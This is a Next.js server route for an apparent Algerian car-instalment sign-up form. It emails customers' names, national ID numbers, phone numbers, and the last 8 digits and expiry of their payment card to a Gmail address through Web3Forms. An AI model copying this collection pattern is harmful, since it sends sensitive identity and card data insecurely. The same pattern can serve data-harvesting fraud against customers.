import { NextResponse } from "next/server"
import { cars } from "@/lib/data"

export async function POST(request: Request) {
  try {
    const body = await request.json()
    const { fullName, nin, cardLast8, cardExpiry, phone1, phone2, hasPreviousInstallment, selectedCarId } = body

    // Find the selected car
    const selectedCar = cars.find((car) => car.id === selectedCarId)

    // Send email using Web3Forms (free, no API key setup required)
    const response = await fetch("https://api.web3forms.com/submit", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Accept: "application/json",
      },
      body: JSON.stringify({
        access_key: process.env.WEB3FORMS_KEY,
        subject: `تسجيل جديد: ${fullName} - ${selectedCar?.brand || ""} ${selectedCar?.model || ""}`,
        from_name: "Showroom Auto Dzair",
        to: "autodzaircontact@gmail.com",
        
        // Customer Information
        "الاسم الكامل": fullName,
        "رقم التعريف الوطني (NIN)": nin,
        "رقم الهاتف الأول": phone1,
        "رقم الهاتف الثاني": phone2 || "غير متوفر",
        
        // Card Information
        "آخر 8 أرقام من البطاقة الذهبية": `****${cardLast8}`,
        "تاريخ انتهاء البطاقة": cardExpiry,
        "شراء سابق بالتقسيط": hasPreviousInstallment ? "نعم" : "لا",
        
        // Car Information
        "السيارة المختارة": selectedCar 
          ? `${selectedCar.brand} ${selectedCar.model} ${selectedCar.year}` 
          : "لم يتم اختيار سيارة",
        "سعر السيارة": selectedCar 
          ? `${new Intl.NumberFormat("ar-DZ").format(selectedCar.price)} دج` 
          : "-",
        "القسط الشهري": selectedCar 
          ? `${new Intl.NumberFormat("ar-DZ").format(selectedCar.monthlyPayment)} دج/شهر` 
          : "-",
        
        // Metadata
        "تاريخ التسجيل": new Date().toLocaleDateString("ar-DZ", {
          year: "numeric",
          month: "long",
          day: "numeric",
          hour: "2-digit",
          minute: "2-digit",
        }),
      }),
    })

    const result = await response.json()

    if (result.success) {
      return NextResponse.json({ success: true })
    } else {
      console.error("Web3Forms error:", result)
      return NextResponse.json({ success: false, error: result.message }, { status: 500 })
    }
  } catch (error) {
    console.error("Registration error:", error)
    return NextResponse.json(
      { success: false, error: "حدث خطأ أثناء التسجيل" },
      { status: 500 }
    )
  }
}
